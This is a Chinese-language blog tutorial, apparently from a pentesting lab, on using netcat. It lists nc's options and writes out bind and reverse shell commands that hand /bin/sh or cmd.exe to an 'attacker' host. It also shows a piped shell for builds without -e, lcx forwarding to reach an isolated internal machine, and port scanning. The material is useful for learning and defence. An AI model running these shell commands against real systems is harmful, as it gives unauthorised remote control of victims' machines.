@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>瑞士军刀nc | mrfan6の博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="NC的简单使用什么是NC：nc是netcat的简写，有着网络界的瑞士军dao美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具 NC的作用：1.实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口2.端口的扫描，nc可以作为client发起TCP或UDP连接3.机器之间传输文件4.机器之间网络测速 NC的常用参数如下：-d 从控制台分离，后台模式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="瑞士军刀nc">
+<meta property="og:url" content="https://mrfan6.github.io/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="mrfan6の博客">
+<meta property="og:description" content="NC的简单使用什么是NC：nc是netcat的简写，有着网络界的瑞士军dao美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具 NC的作用：1.实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口2.端口的扫描，nc可以作为client发起TCP或UDP连接3.机器之间传输文件4.机器之间网络测速 NC的常用参数如下：-d 从控制台分离，后台模式">
+<meta property="og:locale">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/%E5%9B%BE%E7%89%87%202.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/%E5%9B%BE%E7%89%87%204.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/%E5%9B%BE%E7%89%87%205.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162825568.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162902640.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162926148.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162943526.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162954027.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163032322.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163215845.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163224439.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163235124.png">
+<meta property="article:published_time" content="2022-03-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-16T08:36:33.260Z">
+<meta property="article:author" content="mrfan6">
+<meta property="article:tag" content="tools">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/%E5%9B%BE%E7%89%87%202.png">
+  
+    <link rel="alternative" href="/atom.xml" title="mrfan6の博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img src="../../../../../../../../../img/head.jpg" class="js-avatar show">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/HTML/index.html">火影忍者</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
+                            
+                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/tools/" style="font-size: 20px;">tools</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 10px;">靶机</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>            
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/HTML/index.html">火影忍者</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
+                    
+                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-NC的简单使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="article-date">
+      <time datetime="2022-03-31T16:00:00.000Z" itemprop="datePublished">2022-04-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      瑞士军刀nc
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+	<div class="article-entry" itemprop="articleBody">
+	      
+	        
+	            
+	        
+	        
+	        <h1 id="NC的简单使用"><a href="#NC的简单使用" class="headerlink" title="NC的简单使用"></a>NC的简单使用</h1><h2 id="什么是NC："><a href="#什么是NC：" class="headerlink" title="什么是NC："></a>什么是NC：</h2><p>nc是netcat的简写，有着网络界的瑞士军dao美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具</p>
+<h2 id="NC的作用："><a href="#NC的作用：" class="headerlink" title="NC的作用："></a>NC的作用：</h2><p>1.实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>2.端口的扫描，nc可以作为client发起TCP或UDP连接<br>3.机器之间传输文件<br>4.机器之间网络测速</p>
+<h2 id="NC的常用参数如下："><a href="#NC的常用参数如下：" class="headerlink" title="NC的常用参数如下："></a>NC的常用参数如下：</h2><p><strong>-d 从控制台分离，后台模式(关闭cmd后保持后台在线)</strong></p>
+<p><strong>-e 连接后要执行的程序</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows c:\windows\system32\cmd.exe</span><br><span class="line">Linux  sh /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>-l 使用监听模式，管控传入的资料。</strong><br><strong>-n 直接使用IP地址，而不通过域名服务器。</strong><br><strong>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</strong><br><strong>-v 显示指令执行过程。</strong><br>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。<br>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。<br>-h 在线帮助。<br>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。<br>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。<br>-r 乱数指定本地与远端主机的通信端口。<br>-s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。<br>-u 使用UDP传输协议。<br>-w&lt;超时秒数&gt; 设置等待连线的时间。<br>-z 使用0输入/输出模式，只在扫描通信端口时使用。</p>
+<h2 id="NC不支持-e参数"><a href="#NC不支持-e参数" class="headerlink" title="NC不支持-e参数"></a>NC不支持-e参数</h2><p>可以利用到linux中的管道符，首先在kali上开启监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 6666</span><br><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/%E5%9B%BE%E7%89%87%202.png"></p>
+<p>之后在CentOS上使用nc去反向链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/%E5%9B%BE%E7%89%87%204.png"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/%E5%9B%BE%E7%89%87%205.png"></p>
+<h2 id="传输层转发隧道-Netcat"><a href="#传输层转发隧道-Netcat" class="headerlink" title="传输层转发隧道 Netcat"></a>传输层转发隧道 Netcat</h2><p>NC下载地址:<br><a target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
+<h3 id="1-双向连接反弹-shell"><a href="#1-双向连接反弹-shell" class="headerlink" title="1.双向连接反弹 shell"></a>1.双向连接反弹 shell</h3><h4 id="正向：攻击连接受害"><a href="#正向：攻击连接受害" class="headerlink" title="正向：攻击连接受害"></a>正向：攻击连接受害</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">受害：</span><br><span class="line">    nc -ldp 1234 -e /bin/sh 							//linux </span><br><span class="line">    nc -ldp 1234 -e c:\windows\system32\cmd.exe 		//windows </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击：</span><br><span class="line">	nc 受害IP 1234 							//主动连接受害方IP </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162825568.png" alt="image-20220816162825568"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162902640.png" alt="image-20220816162902640"></p>
+<h4 id="反向：受害连接攻击"><a href="#反向：受害连接攻击" class="headerlink" title="反向：受害连接攻击"></a>反向：受害连接攻击</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击：	</span><br><span class="line">	nc -lvp 1234 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">受害：	</span><br><span class="line">	nc 攻击主机 IP 1234 -e /bin/sh 						//linux</span><br><span class="line">	nc 攻击主机 IP 1234 -e c:\windows\system32\cmd.exe 	//windows</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162926148.png" alt="image-20220816162926148"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162943526.png" alt="image-20220816162943526"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816162954027.png" alt="image-20220816162954027"></p>
+<h3 id="2-多向连接反弹-shell-配合转发"><a href="#2-多向连接反弹-shell-配合转发" class="headerlink" title="2.多向连接反弹 shell-配合转发"></a>2.多向连接反弹 shell-配合转发</h3><p>环境: 对于一个主机在内网中不能外联，可以采用多向连接反弹<br>利用外网连接一个没有外网环境的主机。<br>反向连接： </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WIN7-PC1：</span><br><span class="line">	Lcx.exe -listen 2222 3333  #将本地2222转发给本地的3333端口</span><br><span class="line">	</span><br><span class="line">WIN7-PC2：</span><br><span class="line">	nc 192.168.93.20 2222 -e c:\windows\system32\cmd.exe #主动将本机的cmd给到192.168.93.20:2222</span><br><span class="line">	</span><br><span class="line">kali 或本机：</span><br><span class="line">	nc -v 192.168.52.30 3333 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163032322.png" alt="image-20220816163032322"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163215845.png" alt="image-20220816163215845"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163224439.png" alt="image-20220816163224439"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220816163235124.png" alt="image-20220816163235124"></p>
+<h3 id="3-相关-netcat-主要功能测试"><a href="#3-相关-netcat-主要功能测试" class="headerlink" title="3.相关 netcat 主要功能测试"></a>3.相关 netcat 主要功能测试</h3><p>指纹服务：nc -nv 192.168.52.30<br>端口扫描：nc -v -z 192.168.52.30 1-100<br>端口监听：nc -lvp xxxx<br>文件传输：nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1<br>反弹 Shell：见上 </p>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/168661.html">https://www.freebuf.com/sectool/168661.html</a></p>
+
+	        
+	      
+	    </div>
+	    
+	  </div>
+	  
+	    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">瑞士军刀nc</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2022年04月01日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年08月16日 - 16时36分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="瑞士军刀nc">https://mrfan6.github.io/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://mrfan6.github.io/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件包含利用思路</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+	  
+	</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">NC的简单使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFNC%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">什么是NC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">NC的作用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E7%9A%84%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">NC的常用参数如下：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E4%B8%8D%E6%94%AF%E6%8C%81-e%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.</span> <span class="toc-text">NC不支持-e参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93-Netcat"><span class="toc-number">1.5.</span> <span class="toc-text">传输层转发隧道 Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8C%E5%90%91%E8%BF%9E%E6%8E%A5%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.双向连接反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%EF%BC%9A%E6%94%BB%E5%87%BB%E8%BF%9E%E6%8E%A5%E5%8F%97%E5%AE%B3"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">正向：攻击连接受害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%EF%BC%9A%E5%8F%97%E5%AE%B3%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">反向：受害连接攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%9A%E5%90%91%E8%BF%9E%E6%8E%A5%E5%8F%8D%E5%BC%B9-shell-%E9%85%8D%E5%90%88%E8%BD%AC%E5%8F%91"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.多向连接反弹 shell-配合转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%9B%B8%E5%85%B3-netcat-%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD%E6%B5%8B%E8%AF%95"><span class="toc-number">1.5.3.</span> <span class="toc-text">3.相关 netcat 主要功能测试</span></a></li></ol></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="下一篇: 文件包含利用思路">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">瑞士军刀nc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/">CFS三层网络渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMP隧道模式使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">vulnhub靶机Os-hackNos-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2022 mrfan6
+            </div>
+            <div class="footer-right">
+                <a href="#" target="_blank">mrfan6</a>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
